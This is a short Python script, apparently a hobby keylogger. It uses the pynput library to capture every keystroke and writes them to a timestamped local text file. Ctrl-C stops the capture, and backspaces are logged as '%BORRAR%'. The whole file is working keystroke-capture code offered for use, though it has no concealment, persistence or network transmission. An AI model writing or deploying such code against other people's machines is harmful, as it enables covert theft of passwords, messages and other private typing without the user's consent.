import datetime

from pynput.keyboard import Listener
from pynput import keyboard

d = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
f = open(f'keylogger_{d}.txt','w')

COMBINATIONS = [
    # Control-C
    {keyboard.Key.ctrl_l , keyboard.KeyCode(vk=67)},
    {keyboard.Key.ctrl_r , keyboard.KeyCode(vk=67)}
]

def execute():
    f.close()
    quit()

pressed_vks = set()

def get_vk(key):
    return key.vk if hasattr(key, 'vk') else key.value.vk

def is_combination_pressed(combination):
    return all([get_vk(key) in pressed_vks for key in combination])

def on_press(key):
    vk = get_vk(key)
    pressed_vks.add(vk)

    for combination in COMBINATIONS:
        if is_combination_pressed(combination):
            execute()
            break
        
    key = str(key)

    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'",""))

def on_release(key):
    try:
        vk = get_vk(key)
        pressed_vks.remove(vk)
    except:
        pass
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
